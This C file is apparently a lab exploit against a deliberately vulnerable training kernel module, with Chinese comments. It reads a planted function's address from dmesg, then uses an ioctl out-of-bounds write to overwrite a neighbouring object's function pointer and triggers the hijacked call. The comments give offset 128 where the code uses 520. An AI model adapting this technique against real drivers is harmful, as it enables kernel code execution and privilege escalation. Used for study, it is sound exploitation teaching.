#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/uv_oob_dev"

#define IOCTL_MAGIC 'Y'
#define IOCTL_ALLOC_VULN _IOWR(IOCTL_MAGIC, 0x01, int)
#define IOCTL_FREE_VULN _IOW(IOCTL_MAGIC, 0x02, int)
#define IOCTL_WRITE_VULN _IOW(IOCTL_MAGIC, 0x03, int)
#define IOCTL_READ_VULN _IOR(IOCTL_MAGIC, 0x04, int)
#define IOCTL_ALLOC_ELS _IOWR(IOCTL_MAGIC, 0x05, int)
#define IOCTL_FREE_ELS _IOW(IOCTL_MAGIC, 0x06, int)
#define IOCTL_WRITE_ELS _IOW(IOCTL_MAGIC, 0x07, int)
#define IOCTL_READ_ELS _IOR(IOCTL_MAGIC, 0x08, int)
#define IOCTL_ALLOC_VICTIM _IOWR(IOCTL_MAGIC, 0x09, int)
#define IOCTL_FREE_VICTIM _IOW(IOCTL_MAGIC, 0x0A, int)
#define IOCTL_WRITE_VICTIM _IOW(IOCTL_MAGIC, 0x0B, int)
#define IOCTL_READ_VICTIM _IOR(IOCTL_MAGIC, 0x0C, int)
#define IOCTL_EXECUTE_VICTIM _IOW(IOCTL_MAGIC, 0x0D, int)

struct request_arg {
  int handler;
  int offset;
  int length;
  char *value;
};

// 从 dmesg 日志中获取模块初始化时打印的 bad_function 地址
unsigned long get_bad_addr() {
  FILE *fp = popen("dmesg | grep 'bad func'", "r");
  if (!fp)
    return 0;
  char line[256];
  unsigned long addr = 0;
  while (fgets(line, sizeof(line), fp)) {
    char *p = strstr(line, "bad func: 0x");
    if (p) {
      sscanf(p, "bad func: 0x%lx", &addr);
    }
  }
  pclose(fp);
  return addr;
}

int main() {
  int fd;
  int victim_handler;
  int oob_handler;
  unsigned long payload;
  struct request_arg req;

  printf("[*] Kernel OOB Exploit Simulation\n");

  // 0. 获取 bad_function 的内核地址
  unsigned long bad_func_addr = get_bad_addr();
  if (bad_func_addr == 0) {
    printf("[-] Failed to find bad_function address from dmesg.\n");
    printf("[-] Ensure the modulo is loaded and dmesg has the address.\n");
    return -1;
  }
  printf("[+] Found bad_function address: 0x%lx\n", bad_func_addr);

  // 1. 打开设备
  fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("[-] Failed to open the device");
    return -1;
  }
  printf("[+] Device opened successfully.\n");

  // 2. 通过 IOCTL_ALLOC_VICTIM 分配包含 good_function 函数指针的对象
  if (ioctl(fd, IOCTL_ALLOC_VICTIM, &victim_handler) < 0) {
    perror("[-] Failed to allocate victim");
    close(fd);
    return -1;
  }
  printf("[+] Allocated victim with handler: %d\n", victim_handler);

  // 3. 触发 IOCTL_EXECUTE
  // 此时被调用的是 good_function
  printf("[+] Executing original funptr...\n");
  if (ioctl(fd, IOCTL_EXECUTE_VICTIM, &victim_handler) < 0) {
    perror("[-] Failed to execute");
  }

  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler) < 0) {
    perror("[-] Failed to allocate OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Allocated OOB vuln with handler: %d\n", oob_handler);

  // 4. 利用 OOB WRITE 覆盖 buffer (128 bytes) 之后的函数指针
  // struct uv_vulobj_type 的定义使得 funptr 紧跟在 buffer[128] 之后
  // 我们用 IOCTL_WRITE 逐字节将 bad_func_addr 写入 offset 128 到 135 的位置
  printf("[+] Overwriting funptr with bad_function address...\n");
  payload = bad_func_addr;
  req.handler = oob_handler;
  req.offset = 520;
  req.length = 8; // 函数指针大小为 8 字节
  req.length = sizeof(payload);
  req.value = (char *)&payload;

  if (ioctl(fd, IOCTL_WRITE_VULN, &req) < 0) {
    perror("[-] Failed to OOB write");
    close(fd);
    return -1;
  }
  printf("[+] Overwrite done.\n");

  // 5. 触发 IOCTL_EXECUTE
  // 此时被调用的其实已经是 bad_function 了
  printf("[+] Executing hijacked funptr...\n");
  if (ioctl(fd, IOCTL_EXECUTE_VICTIM, &victim_handler) < 0) {
    perror("[-] Failed to execute");
  } else {
    printf("[+] Execute command sent. Run 'dmesg | tail' to check if 'bad' was "
           "printed!\n");
  }

  close(fd);
  return 0;
}